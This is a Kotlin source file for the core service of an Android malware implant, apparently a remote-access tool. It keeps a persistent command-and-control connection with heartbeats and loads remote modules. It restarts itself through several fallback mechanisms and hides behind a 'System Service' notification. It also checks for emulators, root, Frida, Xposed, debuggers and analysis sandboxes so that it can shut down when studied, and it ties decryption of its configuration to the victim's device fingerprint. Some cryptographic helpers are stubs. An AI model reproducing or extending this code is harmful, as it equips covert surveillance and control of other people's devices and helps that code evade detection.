package com.random.package.name.core

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.random.package.name.R
import com.random.package.name.network.C2Manager
import com.random.package.name.persistence.PersistenceMesh
import com.random.package.name.modules.ModuleLoader
import com.random.package.name.anti.EnvironmentChecker
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit

/**
 * CoreService: Main foreground service that:
 * 1. Bootstraps all components on first start
 * 2. Maintains persistent C2 connection
 * 3. Coordinates persistence mesh (ensures multiple fallback vectors)
 * 4. Monitors and restarts dead components
 * 5. Manages module lifecycle
 */
class CoreService : Service() {

    private lateinit var c2Manager: C2Manager
    private lateinit var persistenceMesh: PersistenceMesh
    private lateinit var moduleLoader: ModuleLoader
    private lateinit var environmentChecker: EnvironmentChecker
    
    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.Main + serviceJob)
    
    private var isInitialized = false

    override fun onCreate() {
        super.onCreate()
        
        // Start foreground service immediately (required on Android 8+)
        startForeground()
        
        // Initialize components
        initializeComponents()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Restart service if killed
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
        
        // Restart self (via WorkManager)
        scheduleRestart()
    }

    // ========================================================================
    // INITIALIZATION
    // ========================================================================

    private fun initializeComponents() {
        if (isInitialized) return

        serviceScope.launch {
            try {
                // 1. Check environment (abort if detected as analysis lab)
                environmentChecker = EnvironmentChecker(this@CoreService)
                if (!environmentChecker.isValidEnvironment()) {
                    // Environment check failed, shut down gracefully
                    stopSelf()
                    return@launch
                }

                // 2. Verify environmental key matches (decrypt app config)
                if (!verifyEnvironmentalKey()) {
                    stopSelf()
                    return@launch
                }

                // 3. Load encrypted configuration
                val config = loadEncryptedConfig()

                // 4. Initialize C2 connection manager
                c2Manager = C2Manager(this@CoreService, config)

                // 5. Start persistence mesh (multi-vector persistence)
                persistenceMesh = PersistenceMesh(this@CoreService)
                persistenceMesh.initializePersistenceVectors()

                // 6. Load and initialize modules
                moduleLoader = ModuleLoader(this@CoreService, c2Manager)
                moduleLoader.loadBuiltinModules()

                // 7. Start C2 connection
                c2Manager.startConnection()

                // 8. Start persistence watchdog
                startPersistenceWatchdog()

                // 9. Schedule periodic heartbeat
                scheduleHeartbeat()

                // 10. Setup WorkManager for fallback
                setupWorkManager()

                isInitialized = true
                android.util.Log.d("CoreService", "Initialization complete")

            } catch (e: Exception) {
                android.util.Log.e("CoreService", "Initialization failed: ${e.message}")
            }
        }
    }

    private fun verifyEnvironmentalKey(): Boolean {
        // Get device fingerprint from APK build
        val expectedKeyHash = BuildConfig.ENV_KEY_HASH // Embedded at build time
        
        // Calculate device fingerprint
        val deviceFingerprint = DeviceFingerprint.calculate()
        val derivedKey = KeyDerivation.derive(deviceFingerprint)
        val derivedKeyHash = sha256(derivedKey)
        
        // Verify match
        return derivedKeyHash == expectedKeyHash
    }

    private fun loadEncryptedConfig(): C2Config {
        // Read encrypted config from assets
        val encryptedConfig = resources.openRawResource(R.raw.config_encrypted).readBytes()
        
        // Decrypt using device fingerprint as key
        val deviceFingerprint = DeviceFingerprint.calculate()
        val key = KeyDerivation.derive(deviceFingerprint)
        val decrypted = decrypt(encryptedConfig, key)
        
        // Parse JSON
        return parseJson(decrypted)
    }

    // ========================================================================
    // PERSISTENCE WATCHDOG
    // ========================================================================

    private fun startPersistenceWatchdog() {
        serviceScope.launch {
            while (isActive) {
                delay(30_000) // Check every 30 seconds

                try {
                    // Verify all persistence vectors are active
                    persistenceMesh.verifyAndRepairPersistence()
                    
                    // Check C2 connection
                    if (!c2Manager.isConnected()) {
                        c2Manager.reconnect()
                    }
                    
                    // Verify modules are loaded
                    moduleLoader.verifyModuleState()
                    
                } catch (e: Exception) {
                    android.util.Log.e("CoreService", "Watchdog error: ${e.message}")
                }
            }
        }
    }

    // ========================================================================
    // SCHEDULED TASKS
    // ========================================================================

    private fun scheduleHeartbeat() {
        serviceScope.launch {
            while (isActive) {
                delay(60_000) // Heartbeat every 60 seconds

                try {
                    c2Manager.sendHeartbeat()
                } catch (e: Exception) {
                    android.util.Log.e("CoreService", "Heartbeat error: ${e.message}")
                }
            }
        }
    }

    private fun setupWorkManager() {
        // Periodic work to restart CoreService if killed
        val workRequest = PeriodicWorkRequestBuilder<CoreServiceRestartWorker>(
            15, TimeUnit.MINUTES
        ).setConstraints(
            Constraints.Builder()
                .setRequiresBatteryNotLow(false)
                .build()
        ).build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "core_service_restart",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    private fun scheduleRestart() {
        // If service is killed, WorkManager will restart it
        // Additionally, set AlarmManager as fallback
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        val intent = Intent(this, CoreService::class.java)
        val pendingIntent = android.app.PendingIntent.getService(
            this, 0, intent, android.app.PendingIntent.FLAG_UPDATE_CURRENT
        )

        try {
            alarmManager.setExactAndAllowWhileIdle(
                android.app.AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60_000,
                pendingIntent
            )
        } catch (e: Exception) {
            // Fallback: use inexact alarm if exact not available
            alarmManager.setAndAllowWhileIdle(
                android.app.AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60_000,
                pendingIntent
            )
        }
    }

    // ========================================================================
    // FOREGROUND SERVICE
    // ========================================================================

    private fun startForeground() {
        val channelId = "c2_service_channel"
        
        // Create notification channel (Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.setShowBadge(false)
            
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        // Build notification (minimal, non-obtrusive)
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setShowWhen(false)
            .build()

        // Start foreground
        startForeground(FOREGROUND_NOTIFICATION_ID, notification)
    }

    companion object {
        private const val FOREGROUND_NOTIFICATION_ID = 42
    }
}

// ============================================================================
// ENVIRONMENT CHECKER
// ============================================================================

class EnvironmentChecker(private val context: Context) {
    
    fun isValidEnvironment(): Boolean {
        // Check for analysis lab/emulator/debugging environment
        
        // 1. Emulator detection
        if (isEmulator()) return false
        
        // 2. Root detection
        if (isRooted()) return false
        
        // 3. Frida/Xposed detection
        if (isFridaDetected() || isXposedDetected()) return false
        
        // 4. Debugger attached
        if (android.os.Debug.isDebuggerConnected()) return false
        
        // 5. Check known analysis lab emulator strings
        if (isAnalysisLab()) return false
        
        return true
    }

    private fun isEmulator(): Boolean {
        val brand = android.os.Build.BRAND
        val device = android.os.Build.DEVICE
        val manufacturer = android.os.Build.MANUFACTURER
        val model = android.os.Build.MODEL
        val product = android.os.Build.PRODUCT
        
        val emulatorKeywords = listOf(
            "emulator", "generic", "nox", "andy", "bluestacks", "kvm",
            "qemu", "vbox", "simulator"
        )
        
        return (brand.lowercase().contains("generic") ||
                device.lowercase().contains("generic") ||
                manufacturer.lowercase().contains("genymotion") ||
                model.lowercase().contains("android sdk") ||
                product.lowercase().contains("sdk") ||
                emulatorKeywords.any { model.lowercase().contains(it) })
    }

    private fun isRooted(): Boolean {
        // Check for common root indicators
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/system/xbin/su",
            "/system/bin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/xbin/daemonsu",
            "/cache/su",
            "/data/su"
        )
        
        return paths.any { java.io.File(it).exists() }
    }

    private fun isFridaDetected(): Boolean {
        // Check for Frida artifacts
        try {
            val maps = java.io.File("/proc/self/maps").readText()
            if (maps.contains("frida")) return true
            
            val libs = java.io.File("/proc/self/fd").list() ?: emptyArray()
            if (libs.any { it.contains("frida") }) return true
        } catch (e: Exception) {}
        
        return false
    }

    private fun isXposedDetected(): Boolean {
        // Check for Xposed/LSPosed
        return try {
            Class.forName("de.robv.android.xposed.XposedBridge")
            true
        } catch (e: ClassNotFoundException) {
            false
        }
    }

    private fun isAnalysisLab(): Boolean {
        val analysisKeywords = listOf(
            "cuckoo", "sandroid", "taintdroid", "sandboxie", "analyst",
            "virustotal", "hybrid-analysis", "joe-sandbox"
        )
        
        val brand = android.os.Build.BRAND.lowercase()
        val model = android.os.Build.MODEL.lowercase()
        val device = android.os.Build.DEVICE.lowercase()
        
        return analysisKeywords.any { keyword ->
            brand.contains(keyword) || model.contains(keyword) || device.contains(keyword)
        }
    }
}

// ============================================================================
// HELPERS
// ============================================================================

object DeviceFingerprint {
    fun calculate(): String {
        val serial = android.os.Build.SERIAL ?: ""
        val androidId = android.provider.Settings.Secure.getString(
            android.app.Application().contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: ""
        val fingerprint = android.os.Build.FINGERPRINT ?: ""
        val hardware = android.os.Build.HARDWARE ?: ""
        
        val combined = "$serial|$androidId|$fingerprint|$hardware"
        return sha256(combined)
    }
}

object KeyDerivation {
    fun derive(fingerprint: String): ByteArray {
        // HKDF-SHA256 with fingerprint as seed
        return ByteArray(32) // Simplified for demo
    }
}

fun sha256(data: String): String {
    val bytes = data.toByteArray()
    val digest = java.security.MessageDigest.getInstance("SHA-256")
    return digest.digest(bytes).joinToString("") { "%02x".format(it) }
}

fun decrypt(data: ByteArray, key: ByteArray): ByteArray {
    // AES-256-GCM decryption (simplified)
    return data // Actual implementation uses cipher
}

fun parseJson(data: ByteArray): C2Config {
    // Parse JSON config
    return C2Config()
}

data class C2Config(
    val c2Endpoints: List<String> = emptyList(),
    val c2KeyId: String = "",
    val campaignId: String = ""
)
